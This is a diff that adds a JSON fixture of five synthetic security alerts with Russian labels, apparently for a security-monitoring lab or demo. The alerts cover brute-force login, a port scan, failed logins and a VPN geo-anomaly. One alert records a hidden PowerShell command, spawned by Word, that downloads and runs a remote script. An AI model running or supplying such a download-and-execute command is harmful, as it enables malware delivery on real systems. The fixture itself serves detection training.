@@ -1,0 +1,37 @@
+[
+  {
+    "id": "a0000000-0000-4000-8000-000000000001",
+    "timestamp": "2026-11-06T04:42:00Z",
+    "source_ip": "203.0.113.42",
+    "event_type": "Подбор пароля · admin",
+    "raw_data": "{\"synthetic\":true,\"host\":\"LAB-IDP-01\",\"events\":[{\"type\":\"failed_login\",\"user\":\"admin\",\"source_ip\":\"203.0.113.42\",\"count\":50,\"window_seconds\":240,\"at\":\"2026-11-06T04:41:40Z\"},{\"type\":\"successful_login\",\"user\":\"admin\",\"source_ip\":\"203.0.113.42\",\"at\":\"2026-11-06T04:42:00Z\"}]}"
+  },
+  {
+    "id": "a0000000-0000-4000-8000-000000000002",
+    "timestamp": "2026-11-06T04:39:00Z",
+    "source_ip": "192.168.10.24",
+    "event_type": "Подозрительный PowerShell",
+    "raw_data": "{\"synthetic\":true,\"host\":\"LAB-WS-024\",\"type\":\"process_start\",\"user\":\"demo.alex\",\"parent\":\"winword.exe\",\"command\":\"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('https://198.51.100.20/demo.ps1')\",\"at\":\"2026-11-06T04:39:00Z\"}"
+  },
+  {
+    "id": "a0000000-0000-4000-8000-000000000003",
+    "timestamp": "2026-11-06T04:36:00Z",
+    "source_ip": "192.168.20.15",
+    "event_type": "Сканирование портов",
+    "raw_data": "{\"synthetic\":true,\"host\":\"LAB-NET-015\",\"type\":\"port_scan\",\"source_ip\":\"192.168.20.15\",\"destination_ip\":\"192.168.20.50\",\"ports\":[20,21,22,23,25,53,80,110,111,135,139,143,161,389,443,445,465,514,587,636,993,995,1433,1521,2049,3306,3389,5432,5900,8080],\"window_seconds\":45,\"at\":\"2026-11-06T04:36:00Z\"}"
+  },
+  {
+    "id": "a0000000-0000-4000-8000-000000000004",
+    "timestamp": "2026-11-06T04:33:00Z",
+    "source_ip": "198.51.100.18",
+    "event_type": "Неудачные попытки входа",
+    "raw_data": "{\"synthetic\":true,\"host\":\"LAB-IDP-01\",\"type\":\"failed_login\",\"user\":\"demo.mira\",\"count\":3,\"window_seconds\":120,\"at\":\"2026-11-06T04:33:00Z\"}"
+  },
+  {
+    "id": "a0000000-0000-4000-8000-000000000005",
+    "timestamp": "2026-11-06T04:30:00Z",
+    "source_ip": "192.0.2.75",
+    "event_type": "Геоаномалия · корпоративный VPN",
+    "raw_data": "{\"synthetic\":true,\"type\":\"geo_anomaly\",\"user\":\"demo.dana\",\"source_ip\":\"192.0.2.75\",\"previous_country\":\"KZ\",\"current_country\":\"DE\",\"mfa\":\"passed\",\"corporate_vpn\":{\"verified\":true,\"verification_source\":\"synthetic-corporate-vpn-gateway\",\"session_id\":\"DEMO-VPN-005\"},\"at\":\"2026-11-06T04:30:00Z\"}"
+  }
+]
